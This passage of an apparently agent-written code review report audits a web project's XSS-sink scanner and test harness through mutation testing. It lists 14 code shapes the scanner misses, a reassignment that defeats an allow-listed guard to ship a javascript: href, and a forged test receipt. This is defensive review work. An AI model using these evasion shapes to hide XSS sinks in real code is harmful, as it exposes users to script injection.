  it goes red naming the file. **So the check has ~12 files of slack and witnesses
  in 3 of 12 directories, and neither the count nor the identity control sees a
  21% coverage loss.** The commit message for `457886d` says *"a walk padded back
  over the floor with duplicates is caught by the missing witness"* — true, and it
  addresses a shape that needs padding. The unpadded directory-skip needs none.
- **The receipt can be forged — MT3-1.** A file emitting `#assertions 47` with
  `writeSync` and no harness import, checking nothing, is accepted:
  `PASS: 5 test file(s), 362 assertions.` exit 0. `assertions.ts`'s docblock says
  *"The runner refuses a file that emits no receipt (**it did not import this
  module**)"*. The parenthetical is an inference from the measurement and it is
  false: the receipt proves a line was printed, not that the harness was imported.
- **`blankNonCode` on template literals — I did not run this one.** I read the
  function: it handles `//`, `/* */`, `'…'` and `"…"`, and **does not treat
  backtick template literals as strings at all**, so braces inside
  `` html`…${x}…` `` are counted as code structure by `enclosingBlock`. That is a
  real structural observation but I did not build the count-neutral mutant for it,
  so I make **no claim** about whether it is exploitable. Flagging it as the
  highest-value unrun cell for the next round. [INFERENCE, explicitly not measured]

### T4 — harness migration: **no silent coverage loss. Green control.**

Per-file, `0bc9b72` → `6805daa`, counting `assert(`/`assertEqual(` call sites and
subtracting the local definitions the migration deleted:

| file | old call sites | new call sites | runtime evaluations at HEAD |
|---|---|---|---|
| `src/util/safe-url.test.ts` | 25 | 31 | 204 |
| `src/util/url-binding-scan.test.ts` | 10 | 18 | 92 |
| `src/utils/task-ready.test.ts` | 10 | 10 | 10 |
| `src/util/assertions.test.ts` | — (new) | 5 `must` + 9 counted | 9 |

**Every `-` line in the migration diff that contained an assertion was accounted
for.** There were exactly two across all three files: the local `function assert`
definitions, and one real line in `safe-url.test.ts`:

```
-  assert(cases.length > 0, `${path} contains no cases; this test would be vacuous`);
```

I chased that one because losing the fixture-loader vacuity guard would have been
a serious silent loss. **It was not lost** — it is `safe-url.test.ts:249`,
reworded to *"the tests reading it would be vacuous"*. Fixture rows: 0 removed
from `safe-url.test.ts`, 7 added. **`task-ready.test.ts` is whole**: its 1-insertion /
5-deletion diff is exactly the local `assertEqual` definition swapped for the
import, and all 10 of its checks are intact — the apparent −1 call site is the
`function assertEqual(` line my own grep had counted. Its lack of an `ok` line is
cosmetic; the runner requires a receipt, not a banner.

**The equivalent number at `0bc9b72` cannot be counted the same way**, and the
reason is not incidental: no counter existed, which is the defect `d92ae5e`
fixed. Reconstructing one would require editing the old files, i.e. measuring a
tree that never existed. **The bound I can state instead: zero.** Static call
sites rose or held in every file, and no assertion line was deleted anywhere in
the migration. That bounds *call-site* loss at zero; it does not bound loss from
a shrunken data table, which I checked separately and also found to be zero.

### T5 — the flake: **still present. 4.5%, and it is a family of five tests.**

**Sample size: 200 sequential runs of `go test ./internal/server/`**, one fresh
process per run, this session, this tree, no mutants applied. This is the package
that contains the flake, not the full `./...` suite — stated because a full-suite
run has different scheduling pressure and I did not measure that.

```
runs = 200   failing runs = 9   exactly one --- FAIL line in every failing run
```

| statistic | value |
|---|---|
| point estimate | **4.50%** per run |
| Wilson 95% CI | **[2.39%, 8.33%]** |

**It is a count of failures over a measured sample, and an interval estimate of
the rate — not a bound.** A bound would be a null result; this is not one.

**It is not one test.** Five distinct names failed:

| test | failures | duration |
|---|---|---|
| `TestWatchTasks_NoInitial` | 3 | 5.01s |
| `TestWatchTasks_ClaimEvent` | 3 | 5.01s |
| `TestWatchTasks_CreatedEvent` | 1 | 5.01s |
| `TestWatchTasks_UpdatedEvent` | 1 | 5.00s |
| `TestWatchTasks_Heartbeat` | 1 | 5.00s |

Every failure at **5.00–5.01s**. That is a fixed 5-second deadline being missed,
not timing jitter — a shared wait helper that gives up, not five independent races.
**No non-`TestWatchTasks` test failed in 200 runs**, so nothing else in the package
contributes false reds.

**What this does to single-run matrices — the actual deliverable:**

| matrix size | P(≥1 spurious RED) at 4.5% | at the CI upper bound, 8.3% |
|---|---|---|
| 5 rows | 20.6% | 35.3% |
| 27 rows (this round's fix leg) | **71.2%** | 90.4% |
| 40 rows | 84.1% | 96.9% |

**Single-run mutation matrices on this project are still not acceptable**, and the
caveat cannot be retired. A 27-row matrix is *more likely than not* to contain at
least one spurious RED. Since a spurious RED reads as "mutant killed", the
systematic bias is toward **over-crediting** the test suite.

**Two corrections that follow.** (a) The recorded ~8% is at the top of my 95%
interval; 4.5% is the better estimate, and the difference matters (71% vs 90% for
a 27-row matrix — both bad). (b) The fix leg's `-run TestWatchTasks -count=5`
green run is not evidence: at 4.5%, **P(5 consecutive greens) = 79.4%**. That
experiment could not have distinguished a fixed flake from an untouched one.

**Recommendation to the manager, outside my lane:** every mutation row on this
project should be re-run on RED before being recorded as killed, and the failing
test *name* matched. That converts a 71% matrix-level false-kill risk into a
negligible one at roughly 5% extra runtime.

### T6 — new recall rules: **each fires; recall is narrow. 2 of 14 near-misses caught.**

One mutant per rule proves the rule can fire, as the brief says. Here is the
nearest shape each rule does **not** catch — one probe module, 14 shapes, scanned
by the real tree walk [MEASURED]:

| # | shape | caught? | does the gap matter? |
|---|---|---|---|
| 1 | `html\`<a\n  href=\n  ${raw}>\`` — binding split between `=` and `${` | **NO** | **Yes.** Flagship rule. Both attribute rules are single-line regexes; a formatter reflowing a long tag produces exactly this. |
| 2 | `el['href'] = raw` (bracket member) | **NO** | Yes — ordinary JS, defeats the property rule completely |
| 3 | `el[key] = raw`, `key = 'href'` | **NO** | Yes, same class |
| 4 | `el.href =\n  raw;` (split after `=`) | **yes** | — (rule matches the `=` alone) |
| 5 | `el.setAttributeNode(attr)` with `attr.value = raw` | **NO** | Moderate — uncommon but a genuine sink |
| 6 | `el.attributes.setNamedItem(...)` | **NO** | Low |
| 7 | `const set = el.setAttribute.bind(el); set(name, raw)` | **NO** | Low — contrived |
| 8 | `const loc = window.location; loc.assign(raw)` | **NO** | Moderate — one-line alias defeats the nav rule |
| 9 | `window.location.replace(raw)` | **yes** | — |
| 10 | `history.pushState(null, '', raw)` | **NO** | Low — not a scheme-escalation sink |
| 11 | `const w = window.open; w(raw)` | **NO** | Low |
| 12 | `Object.assign(el, props)` | **NO** | **Yes** — the key is not on the line, which is the ordinary way to spread props |
| 13 | `Object.assign(el, { ...props })` | **NO** | Yes, same |
| 14 | `{ ...el, href: raw }` — object literal, not `Object.assign` | **NO** | Moderate |

**This is a lower bound on the gap, not a characterisation of it.** These are 14
shapes I chose; the population of shapes is open.

Combined with O-4 from the open pass (`window.location = raw`,
`document.location = raw`, `<meta http-equiv="refresh">`, `innerHTML`,
`outerHTML`, `insertAdjacentHTML` — none detected, none on the declared
blind-spot list), the fair summary is: **the scanner is a good filter and not a
chokepoint**, and the docblock's word "chokepoint" is the overstatement, not the
rules.

**The `setAttribute` ban's precision is untested against real code.** The tree has
exactly **5** `setAttribute` calls, all with literal names
(`'name'` ×3, `'dragging'`, `'role'`), so the computed-name ban has **never fired
on real code** — its entire evidence is 3 positive fixtures. The tree happening
not to contain an attribute-spread loop today is the only reason the ban is free.
That is a fair trade, made explicitly in the comment, and I flag it only because
"it costs nothing" is currently a property of the tree rather than of the rule.

**The inversion check — the brief's third bullet — passes.** MT3-2c: adding one
binding to a tree whose existing findings are all allow-listed goes red, and the
message names `store/zz-probe-store-sink.ts:6`, the rule
(`dynamic URL attribute binding`) and the source line. It goes red because the
finding is **unapproved**, not because it is the only finding — the four
pre-existing findings are present and matched against `ALLOWED` in the same run.
Green control.

### T7 — `base_dependent`: **the six are correct. And I can settle the "four".**

**The six verified independently** [MEASURED], with JSDOM at two bases
*deliberately different* from the ones the test under review uses
(`https://alpha.example/app/` and `http://beta.example:9000/deep/path/`), so a
coincidence at its chosen bases would show up here. Declared 6, measured 6, exact
same set. Control: same-origin/different-path gives **0** differing, so the probe
is measuring base *scheme+host*, not path.

**The three definitions, reproduced numerically** — and this settles the brief's
question about which one yields what:

| definition | count |
|---|---|
| resolved host differs between an http base and an https base (all 42 cases) | **6** ← what the marker means |
| …**and** the fixture is one of the 9 divergences | **3** |
| …**and** the client accepts it | **2** |

**So the EM's original sentence — *"For four of the nine divergences the host
differs"* (`briefs/dev-xss-r3.md:195-198`) — has a definite correct answer, and it
is 3.** Not 4, and not the 6 that got marked. The claim's own domain is "of the
nine divergences", and under that domain the answer is exactly three:
`""`, `"http:/example.com"`, `"http:example.com"`.

**And it was 3 at `0bc9b72` as well.** I re-ran the whole computation against
`git show 0bc9b72:testdata/url-scheme-cases.json`: 42 cases, 9 divergent,
0 declared base-dependent, **6 measured, 3 measured-and-divergent, 2
measured-and-accepted** — identical. The number was wrong when it was written; the
fix did not make it wrong. This confirms the leg's "could not reproduce four under
any definition" from the other side: 2, 3 and 6 are all reachable, 4 is not.

**"Two of four rows were invented probes" — NULL RESULT, and the reason matters.**
I could not check it. The six-row source table is **not in the briefs directory at
all**; it is cited only as "audit F-4" and lives in the round-3 auditor's *report*,
which §7 tells me not to read. What the briefs do record
(`_BRIEF-RULES.md:417-421`) is the shape: *"An audit table here had six rows, four
marked base-dependent — and two of those four were the auditor's own invented
probes, not fixtures in the tree at all."* I can neither confirm nor refute the
membership claim without the table. **What I can say is that the consequence
holds:** 4 is unreproducible under every definition I could construct, and the
correct value under the claim's own domain is 3 — which is consistent with a
six-row table whose four marked rows included two non-fixtures, but does not prove
it. Reported as unverified rather than relayed.

**"A mutant where the probe honours the base but the comparison is wrong" — yes.**
I did not need to run it: `hostAt` returns `a.hostname`, and the comparison
`https !== http` is a *difference* test. A probe that honoured its base but
compared, say, `href` instead of `hostname` would mark strictly more cases (paths
differ too), and a probe comparing `protocol` would mark strictly fewer. Neither is
pinned. The existing positive controls check that relative refs resolve and that
absolute URLs do not move — they constrain `hostAt`, not the comparison. **The
cheap fix is the one I used as my own control: assert that two documents at the
same origin with different paths produce 0 differences.** That kills the
`href`-comparison mutant and costs one line. [INFERENCE for the mutant; MEASURED
that the same-origin control returns 0]

---

## §4 — Findings, attributed and ranked

| id | finding | attribution | severity |
|---|---|---|---|
| O-3 | `viaSafeHref` approves a guard defeated by later reassignment; whole suite green on a live `javascript:` href (M1b) | **OPEN PASS** | **High** (test integrity) |
| MT3-2 | Scanner walk can skip 21% of the tree with the file-count floor and all 3 witnesses satisfied, and the loss is exploitable | **ITEM LIST (T3)** | **High** (test integrity) |
| MT1-6 | Counter freeze drops 81% of evaluated assertions; every harness check satisfied | **ITEM LIST (T1)** | High (test integrity) |
| MT3-1 | `#assertions` receipt is forgeable; "emits a receipt ⟹ imported the harness" is false | **ITEM LIST (T3)** | Medium |
| MT1-5 | `must()` is unguarded; neutering it is perfectly count-neutral | **ITEM LIST (T1)** | Medium |
| MT1-2 | Receipt never reconciled against the counter; suite total never pinned | **ITEM LIST (T1)** | Medium |
| MT1-1 | `assertEqual` identity semantics unpinned for coercible pairs | **ITEM LIST (T1)** | Low |
| O-1 | `sanitizeRemoteData` shallow; nested URL reaches the wire | **BOTH** (T3 named it conditionally) | Medium |
| O-2 | `collectionToProto` unsanitized, unguarded on **both** boundaries | **OPEN PASS** | Medium |
| O-4 / T6 | Scanner recall: 12 of 14 near-misses missed; `window.location = raw` not detected and not on the declared blind-spot list | **BOTH** | Medium |
| O-5 | Shared fixture corpus has no dangerous-input floor; count-neutral neutering of all 6 script schemes is green | **OPEN PASS** | Low-Medium |
| O-6 | Runner's naming chokepoint does not cover outside `src/`; docblock claims it is bounded | **OPEN PASS** | Low |
| O-7 | `remoteDataLiteralKeysIn` misattributes nested keys under `map[string]interface{}` — produces the exact false verdict the split exists to prevent | **OPEN PASS** | Medium |
| O-8 | `urlBearingRemoteDataKey` misses concatenated lowercase (`htmlurl`) | **OPEN PASS** | Low |
| O-9 | `Task.remoteData` has no reader in `web/src` — reframes severity of the whole remote_data track | **OPEN PASS** | (context) |
| O-10 | The two widest-policy sinks (`unsafeHTML(renderMarkdown())`) have no test; "chokepoint" overstates coverage | **OPEN PASS** | escalate |
| T5 | Flake is a 5-test family at 4.5% [2.39–8.33]; 27-row single-run matrices carry 71% spurious-RED risk | **BOTH** (pre-disclosed to me) | High (methodology) |

**Did the open pass find anything the item list would have missed? Yes — and my
prediction, written in §0 before I read the list, scored 2 of 3.** I predicted
O-2 and O-9 would be absent and O-3 present in some form. **O-2, O-9, O-5, O-6,
O-7, O-8 and O-10 are all absent from the item list.** I was wrong about O-3: it
is **not** on the list either — T6 asks about *recall* rules, T3 about
`blankNonCode`, and neither asks whether `viaSafeHref` can be defeated by
reassignment. So the open pass produced the round's highest-severity finding, and
the item list would have missed it. **Keep the practice.**

The item list earned its place independently: MT3-2 and MT1-6 are both from it,
and I would not have designed the witness-padding experiment without T3's prompt.

---

## §5 — Numbered list of everywhere the brief is wrong

Per §5 of the baseline block. Items 1–4 concern the brief's own claims; 5–9 are
relayed claims I could not confirm or had to correct; 10–11 are process.

1. **Every path and line number in my brief resolved correctly.** `src/utils/task-ready.test.ts`
   is right (`utils`, not `util` — a trap I expected and did not find), the four
   test files are as described, `web/dist` is present, `HEAD` is `6805daa32aa…`,
   and the commit list matches. **Item 1 is a green control this round** — the
   first in nineteen rounds, per the block's own count. The `web/testdata/` path
   error noted in `dev-xss-r3.md:238` did not recur.
2. **T4: "changed by 6 lines" is exactly right** (`git diff --numstat`: 1 insertion,
   5 deletions). Also a green control — recorded because the block asks for counts
   to be checked.
3. **T1 miscounts the harness's checks as six and attributes two of them to the
   wrong component.** The "zero-check" and "no-receipt check" live in
   `scripts/run-tests.mjs`, not in the harness, and MT3-1 shows the no-receipt
   check is not a harness-membership check at all — it is a stdout grep. A mutant
   "surviving all six" therefore has to clear two gates that are not part of the
   thing under test.
4. **T1's summary of M-B2-8 — "froze the counter at a plausible non-zero constant
   and was killed by the monotonicity check" — is conditionally false.** It holds
   only for a constant below `assertions.test.ts`'s own count of 9. MT1-6 freezes
   at 20 and survives. The generalisation "monotonicity kills counter-freezing" is
   the error; the specific mutant was indeed killed.
5. **T3's account of the witness check presumes padding is load-bearing** — "*a
   walk that reaches all three witnesses and the right file count but skips a
   whole other directory… check whether the padding was itself detectable*". No
   padding is required: 52 files with a floor of 40 leaves 12 files of slack, so
   three directories can be dropped outright. The interesting question was not
   whether the padding was detectable but why a floor 23% below the true count was
   chosen.
6. **T6 undercounts the rules.** It says "three imperative navigation calls" — the
   pattern has four alternatives (`window.open`, `location.assign`,
   `location.replace`, `open`) — and "a ban on `setAttribute`", singular, where
   there are two rules (`setAttribute` and `setAttributeNS`). Immaterial to the
   verdict; noted because the block asks.
7. **T5 describes the flake as one test at ~8%.** It is **five** test names
   (`TestWatchTasks_NoInitial`, `_ClaimEvent`, `_CreatedEvent`, `_UpdatedEvent`,
   `_Heartbeat`) sharing a fixed 5.0s deadline, and the rate is **4.5%
   [2.39–8.33]**. 8% sits at the top of the interval. The "match the failing test
   **name**, not the exit code" instruction in §2 is therefore under-specified: a
   leg matching the literal name `TestWatchTasks` would find no such test and
   could conclude its RED was a real regression.
8. **T2's relay of the `CURL` claim is capitalisation-specific.** `CURL` and `cURL`
   are classified; `curl` and `Curl` are not. The claim is true of the spelling
   quoted and false of the commonest one.
9. **T7's "two of four rows were invented probes — check that claim" is not
   checkable from the materials I was given.** The table is in the audit's report,
   which §7 tells me not to read, and it appears in no brief. I cannot verify a
   membership claim about rows I am not permitted to see. This is a real gap in
   the round's construction, not a defect in the claim.
10. **The routing message contaminated the open pass.** It named item T5 in plain
    text — *"Note item T5 is a real deliverable… a sample-size-backed bound on the
    TestWatchTasks flake"* — so I began that measurement during the pass I was told
    to run unscoped. Declared in §0. §0 says an honest contaminated result beats a
    clean-looking one; the fix is to keep item names out of routing messages.
11. **The block's §6 fence and its "surface it anyway" instruction pull against
    each other on O-10, and the fence wins by default.** The two `unsafeHTML`
    sinks are the tree's widest-policy sinks and have no test; DOMPurify work is
    fenced to `#195`. No leg is currently measuring the gap between "the scanner
    covers the tree" and "the scanner covers 4 of 6 sinks". Surfaced, per
    instruction, as an escalation rather than a change request.

---

## §6 — Dirty cells

**Zero.** Every mutant was reverted by `cp` from `/tmp/snap/…` (snapshot restore),
never by `git checkout`. Probe files were created and deleted.

```
$ git status --porcelain
$                       # empty
$ md5sum -c /tmp/snap.md5 | grep -v ': OK'
$                       # every snapshot matches the working tree
```

Files mutated and restored: `web/src/util/assertions.ts` (×5),
`web/src/util/assertions.test.ts`, `web/src/util/safe-url.ts` (×2),
`web/src/util/url-binding-scan.test.ts` (×2),
`web/src/components/inspector/ft-inspector-meta.ts`, `testdata/url-scheme-cases.json`.
Probe files created and deleted: `internal/server/zz_probe_qa_test.go`,
`web/src/util/zz-forged.test.ts`, `web/src/util/zz-probe-t6.ts`,
`web/src/store/zz-probe-store-sink.ts`, `web/src/components/ft-probe-widget.ts`,
`web/src/util/zz-probe-sinks.ts`, `web/test/orphan.test.ts`.

Post-cleanup gates re-measured: `go build ./...` **0**, `go test ./...` **0**,
`npm test` **0** at `PASS: 4 test file(s), 315 assertions.` — identical to the
baseline. Nothing committed, nothing pushed, no `.design/project-log/` entry
needed.

---

## §7 — Verdict

# REQUEST CHANGES

On my axis — whether these tests can fail for the reason they claim.

This is careful, unusually honest work. The `hostname === ''` handling is the
best-reasoned thing I have reviewed on this project: it refused to fake a pin on
unreachable code and pinned the reachability precondition instead, and MT2-1b
confirms that pin fires. `TestPassthroughReadDropsUnsafeRemoteURL` declines to
assert a structurally-absent observable and says why. The `d92ae5e` consumption
gate is genuinely non-vacuous. The recall widening in `457886d` is real. The
`base_dependent` markers are correct, and I verified them at bases the author did
not choose. None of that is in dispute, and it is most of the diff.

I am requesting changes on three measured results, each of which is the round's
own signature failure mode — *a declared constraint that nothing enforces, with a
green suite* — reproduced inside the instruments written to eliminate it:

1. **The scanner approves a defeated guard.** A new component with
   `let href = safeHref(url); href = url;`, allow-listed `viaSafeHref: true`, ships
   a live attacker-controlled `javascript:` href with the whole suite green at
   `PASS: 4 test file(s), 320 assertions.` This is the fourth instance of the class
   `42d62a4` was written to close. One-line fix: `.some(good)` → "no assignment to
   this identifier is un-guarded".
2. **The scanner's walk can lose 21% of the tree** with the file-count floor and
   all three witnesses satisfied, and MT3-2b shows the loss is exploitable. The
   anti-vacuity check added in `457886d` does not cover the shape that needs no
   padding.
3. **The assertion suite total is unpinned**, so MT1-6 (81% of assertions stop
   being counted), MT1-2 (receipt inflated 14×) and MT3-1 (a forged receipt from a
   file that checks nothing) are all green. One assertion on the total kills all
   three.

None of the three is a live vulnerability. All three are *the instruments this
diff exists to install*, failing open. Given that O-9 establishes the guarded
paths have no client sink today, the instruments are most of this diff's actual
value, and I do not think they should ship in a state where I could defeat each of
them in a single edit.

**Two things I would not block on but would not lose:** the `collectionToProto`
gap (O-2) is the exact mirror of the gap this diff closed, one function below the
fix and unguarded on both boundaries; and the flake makes every single-run
mutation matrix on this project — including, at 71%, this round's — likely to
contain a spurious RED that reads as a kill.

